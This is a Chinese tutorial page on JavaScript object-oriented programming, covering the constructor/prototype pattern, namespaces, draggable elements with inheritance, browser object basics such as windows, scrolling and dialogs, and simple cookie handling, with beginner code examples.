<h2 id="流行的面向对象编写方式"><a href="#流行的面向对象编写方式" class="headerlink" title="流行的面向对象编写方式"></a>流行的面向对象编写方式</h2><h3 id="用混合方式构造对象"><a href="#用混合方式构造对象" class="headerlink" title="用混合方式构造对象"></a>用混合方式构造对象</h3><ul>
<li>混合的的构造函数/原型方式</li>
<li>Mixed Constructor Function/Prototype Method</li>
</ul>
<h3 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h3><ul>
<li>构造函数：加属性</li>
<li>原型：加方法</li>
</ul>
<h3 id="对象命名规范"><a href="#对象命名规范" class="headerlink" title="对象命名规范"></a>对象命名规范</h3><ul>
<li>类名首字母大写</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">function CreatePerson(name, qq)		//构造函数</div><div class="line">&#123;</div><div class="line">	this.name=name;</div><div class="line">	this.qq=qq;</div><div class="line">&#125;</div><div class="line"></div><div class="line">CreatePerson.prototype.showName=function ()	//原型</div><div class="line">&#123;</div><div class="line">	alert(&apos;我的名字叫：&apos;+this.name);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">CreatePerson.prototype.showQQ=function ()</div><div class="line">&#123;</div><div class="line">	alert(&apos;我的QQ号：&apos;+this.qq);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">var obj=new CreatePerson(&apos;blue&apos;, &apos;258248832&apos;);</div><div class="line">var obj2=new CreatePerson(&apos;张三&apos;, &apos;45648979879&apos;);</div><div class="line"></div><div class="line">/*obj.showName();</div><div class="line">obj.showQQ();</div><div class="line"></div><div class="line">obj2.showName();</div><div class="line">obj2.showQQ();*/</div><div class="line">alert(obj.showName==obj2.showName);</div></pre></td></tr></table></figure>
<h1 id="JS面向对象实例"><a href="#JS面向对象实例" class="headerlink" title="JS面向对象实例"></a>JS面向对象实例</h1><h2 id="实例：面向对象的选项卡"><a href="#实例：面向对象的选项卡" class="headerlink" title="实例：面向对象的选项卡"></a>实例：面向对象的选项卡</h2><h3 id="把面向过程的程序，改写成面向对象的形式"><a href="#把面向过程的程序，改写成面向对象的形式" class="headerlink" title="把面向过程的程序，改写成面向对象的形式"></a>把面向过程的程序，改写成面向对象的形式</h3><h4 id="原则-1"><a href="#原则-1" class="headerlink" title="原则"></a>原则</h4><ul>
<li>不能有函数套函数、但可以有全局变量</li>
</ul>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ul>
<li>onload        →   构造函数</li>
<li>全局变量    →    属性</li>
<li>函数        →    方法</li>
</ul>
<h4 id="改错"><a href="#改错" class="headerlink" title="改错"></a>改错</h4><ul>
<li>this、事件、闭包、传参</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">#div1 input &#123;background:white;&#125;</div><div class="line">#div1 input.active &#123;background:yellow;&#125;</div><div class="line">#div1 div &#123;width:200px; height:200px; background:#CCC; display:none;&#125;</div><div class="line"></div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	new TabSwitch(&apos;div1&apos;);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">function TabSwitch(id)</div><div class="line">&#123;</div><div class="line">	var _this=this;</div><div class="line">	var oDiv=document.getElementById(id);</div><div class="line">	</div><div class="line">	this.aBtn=oDiv.getElementsByTagName(&apos;input&apos;);</div><div class="line">	this.aDiv=oDiv.getElementsByTagName(&apos;div&apos;);</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;this.aBtn.length;i++)</div><div class="line">	&#123;</div><div class="line">		this.aBtn[i].index=i;</div><div class="line">		this.aBtn[i].onclick=function ()</div><div class="line">		&#123;</div><div class="line">			_this.fnClick(this);</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">TabSwitch.prototype.fnClick=function (oBtn)</div><div class="line">&#123;</div><div class="line">	//alert(this);</div><div class="line">	for(var i=0;i&lt;this.aBtn.length;i++)</div><div class="line">	&#123;</div><div class="line">		this.aBtn[i].className=&apos;&apos;</div><div class="line">		this.aDiv[i].style.display=&apos;none&apos;;</div><div class="line">	&#125;</div><div class="line">	oBtn.className=&apos;active&apos;;</div><div class="line">	this.aDiv[oBtn.index].style.display=&apos;block&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;</div><div class="line">&lt;input class=&quot;active&quot; type=&quot;button&quot; value=&quot;aaa&quot; /&gt;</div><div class="line">&lt;input type=&quot;button&quot; value=&quot;bbb&quot; /&gt;</div><div class="line">&lt;input type=&quot;button&quot; value=&quot;ccc&quot; /&gt;</div><div class="line">&lt;div style=&quot;display:block;&quot;&gt;aaa&lt;/div&gt;</div><div class="line">&lt;div&gt;dfsadf&lt;/div&gt;</div><div class="line">&lt;div&gt;erwqerwe&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
<h3 id="对象与闭包"><a href="#对象与闭包" class="headerlink" title="对象与闭包"></a>对象与闭包</h3><p>有权访问另一个函数作用域内变量的函数都是闭包<br>通过闭包传递this</p>
<h1 id="JS面向对象高级"><a href="#JS面向对象高级" class="headerlink" title="JS面向对象高级"></a>JS面向对象高级</h1><h2 id="Json方式的面向对象"><a href="#Json方式的面向对象" class="headerlink" title="Json方式的面向对象"></a>Json方式的面向对象</h2><h3 id="把方法包在一个Json里"><a href="#把方法包在一个Json里" class="headerlink" title="把方法包在一个Json里"></a>把方法包在一个Json里</h3><ul>
<li>有人管他叫——命名空间</li>
<li>在公司里，把同一类方法，包在一起</li>
<li>不适合多个对象</li>
</ul>
<h4 id="Json的对象"><a href="#Json的对象" class="headerlink" title="Json的对象"></a>Json的对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">var json=&#123;</div><div class="line">	name: &apos;blue&apos;,</div><div class="line">	qq: &apos;258248832&apos;,</div><div class="line">	</div><div class="line">	showName: function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的名字叫：&apos;+this.name);</div><div class="line">	&#125;,</div><div class="line">	showQQ: function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的QQ号是：&apos;+this.qq);</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">var json2=&#123;</div><div class="line">	name: &apos;...&apos;,</div><div class="line">	qq: &apos;258248832&apos;,</div><div class="line">	</div><div class="line">	showName: function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的名字叫：&apos;+this.name);</div><div class="line">	&#125;,</div><div class="line">	showQQ: function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的QQ号是：&apos;+this.qq);</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">json.showName();</div><div class="line">json.showQQ();</div></pre></td></tr></table></figure>
<h4 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">var zns=&#123;&#125;;</div><div class="line"></div><div class="line">zns.common=&#123;&#125;;</div><div class="line">zns.fx=&#123;&#125;;</div><div class="line">zns.site=&#123;&#125;;</div><div class="line"></div><div class="line">zns.common.getUser=function ()</div><div class="line">&#123;</div><div class="line">	alert(&apos;a&apos;);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">zns.fx.getUser=function ()</div><div class="line">&#123;</div><div class="line">	alert(&apos;b&apos;);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">zns.site.getUser=function ()</div><div class="line">&#123;</div><div class="line">	alert(&apos;c&apos;);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">zns.common.getUser();</div><div class="line">zns.fx.getUser();</div><div class="line">zns.site.getUser();</div></pre></td></tr></table></figure>
<h2 id="拖拽和继承"><a href="#拖拽和继承" class="headerlink" title="拖拽和继承"></a>拖拽和继承</h2><h3 id="面向对象的拖拽"><a href="#面向对象的拖拽" class="headerlink" title="面向对象的拖拽"></a>面向对象的拖拽</h3><ul>
<li>改写原有拖拽</li>
</ul>
<h3 id="对象的继承"><a href="#对象的继承" class="headerlink" title="对象的继承"></a>对象的继承</h3><ul>
<li>什么是继承<br> 在原有类的基础上，略作修改，得到一个新的类<br> 不影响原有类的功能</li>
</ul>
<h3 id="instanceof运算符"><a href="#instanceof运算符" class="headerlink" title="instanceof运算符"></a>instanceof运算符</h3><ul>
<li>查看对象是否是某个类的实例</li>
</ul>
<h3 id="父类"><a href="#父类" class="headerlink" title="父类"></a>父类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">function Drag(id)</div><div class="line">&#123;</div><div class="line">	var _this=this;</div><div class="line">	this.disX=0;</div><div class="line">	this.disY=0;</div><div class="line">	</div><div class="line">	this.oDiv=document.getElementById(id);</div><div class="line">	this.oDiv.onmousedown=function (ev)</div><div class="line">	&#123;</div><div class="line">		_this.fnDown(ev);</div><div class="line">		</div><div class="line">		return false;</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Drag.prototype.fnDown=function (ev)</div><div class="line">&#123;</div><div class="line">	var _this=this;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	</div><div class="line">	this.disX=oEvent.clientX-this.oDiv.offsetLeft;</div><div class="line">	this.disY=oEvent.clientY-this.oDiv.offsetTop;</div><div class="line">	</div><div class="line">	document.onmousemove=function (ev)</div><div class="line">	&#123;</div><div class="line">		_this.fnMove(ev);</div><div class="line">	&#125;;</div><div class="line">	document.onmouseup=function ()</div><div class="line">	&#123;</div><div class="line">		_this.fnUp();</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Drag.prototype.fnMove=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	</div><div class="line">	this.oDiv.style.left=oEvent.clientX-this.disX+&apos;px&apos;;</div><div class="line">	this.oDiv.style.top=oEvent.clientY-this.disY+&apos;px&apos;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Drag.prototype.fnUp=function ()</div><div class="line">&#123;</div><div class="line">	document.onmousemove=null;</div><div class="line">	document.onmouseup=null;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="HTML部分"><a href="#HTML部分" class="headerlink" title="HTML部分"></a>HTML部分</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:200px; height:200px; background:yellow; position:absolute;&#125;</div><div class="line">#div2 &#123;width:200px; height:200px; background:green; position:absolute;&#125;</div><div class="line"></div><div class="line">&lt;script src=&quot;Drag.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;script src=&quot;LimitDrag.js&quot;&gt;&lt;/script&gt;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	new Drag(&apos;div1&apos;);</div><div class="line">	new LimitDrag(&apos;div2&apos;);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;普通拖拽&lt;/div&gt;</div><div class="line">&lt;div id=&quot;div2&quot;&gt;限制范围&lt;/div&gt;</div></pre></td></tr></table></figure>
<h2 id="使用继承"><a href="#使用继承" class="headerlink" title="使用继承"></a>使用继承</h2><h3 id="限制范围的拖拽类"><a href="#限制范围的拖拽类" class="headerlink" title="限制范围的拖拽类"></a>限制范围的拖拽类</h3><h4 id="继承类"><a href="#继承类" class="headerlink" title="继承类"></a>继承类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">function LimitDrag(id)</div><div class="line">&#123;</div><div class="line">	Drag.call(this, id);	//继承属性</div><div class="line">&#125;</div><div class="line"></div><div class="line">for(var i in Drag.prototype)</div><div class="line">&#123;</div><div class="line">	LimitDrag.prototype[i]=Drag.prototype[i];</div><div class="line">&#125;</div><div class="line"></div><div class="line">LimitDrag.prototype.fnMove=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	var l=oEvent.clientX-this.disX;</div><div class="line">	var t=oEvent.clientY-this.disY;</div><div class="line">	</div><div class="line">	if(l&lt;0)</div><div class="line">	&#123;</div><div class="line">		l=0;</div><div class="line">	&#125;</div><div class="line">	else if(l&gt;document.documentElement.clientWidth-this.oDiv.offsetWidth)</div><div class="line">	&#123;</div><div class="line">		l=document.documentElement.clientWidth-this.oDiv.offsetWidth;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	this.oDiv.style.left=l+&apos;px&apos;;</div><div class="line">	this.oDiv.style.top=t+&apos;px&apos;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="构造函数伪装"><a href="#构造函数伪装" class="headerlink" title="构造函数伪装"></a>构造函数伪装</h4><ul>
<li>属性的继承<br> 原理：欺骗构造函数</li>
<li>call的使用</li>
</ul>
<h5 id="属性的继承"><a href="#属性的继承" class="headerlink" title="属性的继承"></a>属性的继承</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function A()</div><div class="line">&#123;</div><div class="line">	this.abc=12;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//继承A</div><div class="line"></div><div class="line">function B()</div><div class="line">&#123;</div><div class="line">	//this-&gt;new B()</div><div class="line">	A.call(this);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="call的使用"><a href="#call的使用" class="headerlink" title="call的使用"></a>call的使用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">function show(a, b)</div><div class="line">&#123;</div><div class="line">	alert(&apos;this是：&apos;+this+&apos;\na是：&apos;+a+&apos;\nb是：&apos;+b);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//show(12, 5);</div><div class="line">show.call(&apos;abc&apos;, 12, 5);</div></pre></td></tr></table></figure>
<h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><ul>
<li>方法的继承<br> 原理：复制方法</li>
<li>覆盖原型和方法复制</li>
</ul>
<h5 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var arr1=[1,2,3];</div><div class="line">var arr2=arr1;</div><div class="line"></div><div class="line">arr2.push(4);</div><div class="line"></div><div class="line">alert(arr1);	//1,2,3,4</div><div class="line">alert(arr2);	//1,2,3,4</div></pre></td></tr></table></figure>
<h5 id="方法的继承"><a href="#方法的继承" class="headerlink" title="方法的继承"></a>方法的继承</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//继承父类方法</div><div class="line">for(var i in A.prototype)</div><div class="line">&#123;</div><div class="line">	B.prototype[i]=A.prototype[i];</div><div class="line">&#125;</div><div class="line"></div><div class="line">//自己的方法</div><div class="line">B.prototype.fn=function ()</div><div class="line">&#123;</div><div class="line">	alert(&apos;abc&apos;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="系统对象"><a href="#系统对象" class="headerlink" title="系统对象"></a>系统对象</h2><h3 id="本地对象（非静态对象）"><a href="#本地对象（非静态对象）" class="headerlink" title="本地对象（非静态对象）"></a>本地对象（非静态对象）</h3><ul>
<li>什么是本地对象，需要实例化（new）</li>
<li>常用对象<br> Object、Function、Array、String、Boolean、Number、Date、RegExp、Error<h3 id="内置对象（静态对象）"><a href="#内置对象（静态对象）" class="headerlink" title="内置对象（静态对象）"></a>内置对象（静态对象）</h3></li>
<li>什么是本地对象<br> Global、Math<h3 id="宿主对象（由浏览器提供的对象）"><a href="#宿主对象（由浏览器提供的对象）" class="headerlink" title="宿主对象（由浏览器提供的对象）"></a>宿主对象（由浏览器提供的对象）</h3></li>
<li>DOM、BOM</li>
</ul>
<h1 id="BOM应用"><a href="#BOM应用" class="headerlink" title="BOM应用"></a>BOM应用</h1><h2 id="BOM基础"><a href="#BOM基础" class="headerlink" title="BOM基础"></a>BOM基础</h2><h3 id="打开、关闭窗口"><a href="#打开、关闭窗口" class="headerlink" title="打开、关闭窗口"></a>打开、关闭窗口</h3><h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><ul>
<li>window.open(‘url’,’_blank’)</li>
<li>window.open有返回值，返回值就是打开的页面</li>
</ul>
<h5 id="例子：运行"><a href="#例子：运行" class="headerlink" title="例子：运行"></a>例子：运行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var oNewWin=window.open(&apos;about:blank&apos;, &apos;_blank&apos;);</div><div class="line">		</div><div class="line">		oNewWin.document.write(oTxt.value);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="close"><a href="#close" class="headerlink" title="close"></a>close</h4><ul>
<li>关闭时提示问题</li>
<li>火狐里不能不用close关闭非open的窗口<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">window.close()</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h3><ul>
<li>window.navigator.userAgent           //当前浏览器版本信息</li>
<li>window.location                      //当前页面的地址，可读取还可赋值</li>
</ul>
<h4 id="window-location"><a href="#window-location" class="headerlink" title="window.location"></a>window.location</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">window.location=&apos;http://www.uknow.top&apos;</div></pre></td></tr></table></figure>
<h2 id="尺寸及坐标"><a href="#尺寸及坐标" class="headerlink" title="尺寸及坐标"></a>尺寸及坐标</h2><h3 id="窗口尺寸、工作区尺寸"><a href="#窗口尺寸、工作区尺寸" class="headerlink" title="窗口尺寸、工作区尺寸"></a>窗口尺寸、工作区尺寸</h3><h3 id="可视区尺寸"><a href="#可视区尺寸" class="headerlink" title="可视区尺寸"></a>可视区尺寸</h3><ul>
<li>仅跟窗口大小有关</li>
<li>document.documentElement.clientWidth</li>
<li>document.documentElement.clientHeight</li>
</ul>
<h3 id="滚动距离"><a href="#滚动距离" class="headerlink" title="滚动距离"></a>滚动距离</h3><ul>
<li>随着滚动距离变大</li>
<li>document.body.scrollTop</li>
<li>document.documentElement.scrollTop</li>
</ul>
<h4 id="兼容写法"><a href="#兼容写法" class="headerlink" title="兼容写法"></a>兼容写法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">document.onclick=function ()</div><div class="line">&#123;</div><div class="line">	//IE、FF</div><div class="line">	//alert(document.documentElement.scrollTop);</div><div class="line">	</div><div class="line">	//chrome</div><div class="line">	//alert(document.body.scrollTop);</div><div class="line">	</div><div class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</div><div class="line">	</div><div class="line">	alert(scrollTop);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="常用方法和事件"><a href="#常用方法和事件" class="headerlink" title="常用方法和事件"></a>常用方法和事件</h2><h3 id="系统对话框"><a href="#系统对话框" class="headerlink" title="系统对话框"></a>系统对话框</h3><ul>
<li>警告框：alert(“内容”)，没有返回值</li>
<li>选择框：confirm(“提问的内容”)，返回boolean</li>
<li>输入框：prompt()，返回字符串或null</li>
</ul>
<h4 id="选择框：confirm"><a href="#选择框：confirm" class="headerlink" title="选择框：confirm"></a>选择框：confirm</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var res=confirm(&apos;你是否要删除&apos;);</div><div class="line"></div><div class="line">alert(res);</div></pre></td></tr></table></figure>
<h4 id="输入框：prompt"><a href="#输入框：prompt" class="headerlink" title="输入框：prompt"></a>输入框：prompt</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var res=prompt(&apos;请输入你的姓名&apos;, &apos;blue&apos;);</div><div class="line"></div><div class="line">alert(res);</div></pre></td></tr></table></figure>
<h3 id="window对象常用事件"><a href="#window对象常用事件" class="headerlink" title="window对象常用事件"></a>window对象常用事件</h3><ul>
<li>onload   </li>
<li>onscroll  //当滚动时事件发生</li>
<li>onresize  //当改变时事件发生</li>
</ul>
<h4 id="例子：回到顶部按钮、侧边栏广告"><a href="#例子：回到顶部按钮、侧边栏广告" class="headerlink" title="例子：回到顶部按钮、侧边栏广告"></a>例子：回到顶部按钮、侧边栏广告</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:200px; height:150px; background:red; position:absolute; right:0; bottom:0;&#125;</div><div class="line">body &#123;height:2000px;&#125;</div><div class="line"></div><div class="line">window.onscroll=window.onresize=function ()</div><div class="line">&#123;</div><div class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.style.top=document.documentElement.clientHeight-oDiv.offsetHeight+scrollTop+&apos;px&apos;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h4 id="闪烁问题"><a href="#闪烁问题" class="headerlink" title="闪烁问题"></a>闪烁问题</h4><ul>
<li>userAgent&gt;IE6  —&gt;    fixed</li>
<li>IE             —&gt;    运动</li>
</ul>
<h1 id="COOKIE基础与应用"><a href="#COOKIE基础与应用" class="headerlink" title="COOKIE基础与应用"></a>COOKIE基础与应用</h1><h2 id="cookie基础"><a href="#cookie基础" class="headerlink" title="cookie基础"></a>cookie基础</h2><h3 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie"></a>什么是cookie</h3><h4 id="页面用来保存信息"><a href="#页面用来保存信息" class="headerlink" title="页面用来保存信息"></a>页面用来保存信息</h4><ul>
<li>比如：自动登录、记住用户名</li>
</ul>
<h4 id="cookie的特性"><a href="#cookie的特性" class="headerlink" title="cookie的特性"></a>cookie的特性</h4><ul>
<li>同一个网站中所有页面共享一套cookie</li>
<li>数量、大小有限</li>
<li>过期时间</li>
</ul>
<h4 id="JS中使用cookie"><a href="#JS中使用cookie" class="headerlink" title="JS中使用cookie"></a>JS中使用cookie</h4><ul>
<li><p>document.cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">document.cookie=&apos;user=blue&apos;;		//添加</div><div class="line">document.cookie=&apos;pass=123456&apos;;</div><div class="line"></div><div class="line">alert(document.cookie);</div></pre></td></tr></table></figure>
</li>
<li><p>Date()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var oDate=new Date();</div><div class="line"></div><div class="line">oDate.setDate(oDate.getDate()+800000);</div><div class="line"></div><div class="line">alert(oDate.getFullYear()+&apos;-&apos;+(oDate.getMonth()+1)+&apos;-&apos;+oDate.getDate());</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="使用cookie-1"><a href="#使用cookie-1" class="headerlink" title="使用cookie - 1"></a>使用cookie - 1</h2><h3 id="cookie的使用"><a href="#cookie的使用" class="headerlink" title="cookie的使用"></a>cookie的使用</h3><h4 id="设置cookie"><a href="#设置cookie" class="headerlink" title="设置cookie"></a>设置cookie</h4><ul>
<li>格式：名字=值</li>
<li>不会覆盖</li>
<li>过期时间：expires=时间<br> 日期对象的使用</li>
<li>封装函数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">function setCookie(name, value, iDay)</div><div class="line">&#123;</div><div class="line">	var oDate=new Date();</div><div class="line">	oDate.setDate(oDate.getDate()+iDay);</div><div class="line">	</div><div class="line">	document.cookie=name+&apos;=&apos;+value+&apos;;expires=&apos;+oDate;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
